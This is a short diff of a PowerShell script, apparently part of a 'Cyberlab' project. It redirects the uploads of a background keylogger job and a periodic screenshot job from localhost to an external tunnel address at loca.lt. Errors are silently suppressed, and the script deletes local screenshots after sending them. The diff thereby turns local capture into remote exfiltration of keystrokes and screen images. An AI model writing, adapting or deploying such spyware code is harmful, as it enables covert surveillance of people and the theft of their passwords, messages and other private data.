@@ -46,7 +46,7 @@ $keylog = Start-Job -ScriptBlock {
         }
         Start-Sleep -Seconds 60
         try {
-            Invoke-WebRequest -Uri "http://localhost:8080/upload" -Method POST -InFile $logfile -ErrorAction SilentlyContinue
+            Invoke-WebRequest -Uri "http://mycyberlab-upload.loca.lt:8080/upload" -Method POST -InFile $logfile -ErrorAction SilentlyContinue
         } catch {}
     }
 }
@@ -62,7 +62,7 @@ $screenshot = Start-Job -ScriptBlock {
         $filename = "C:\Cyberlab\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
         $bitmap.Save($filename)
         try {
-            Invoke-WebRequest -Uri "http://localhost:8080/upload" -Method POST -InFile $filename -ErrorAction SilentlyContinue
+            Invoke-WebRequest -Uri "http://mycyberlab-upload.loca.lt:8080/upload" -Method POST -InFile $filename -ErrorAction SilentlyContinue
         } catch {}
         Remove-Item $filename
         Start-Sleep -Seconds 300
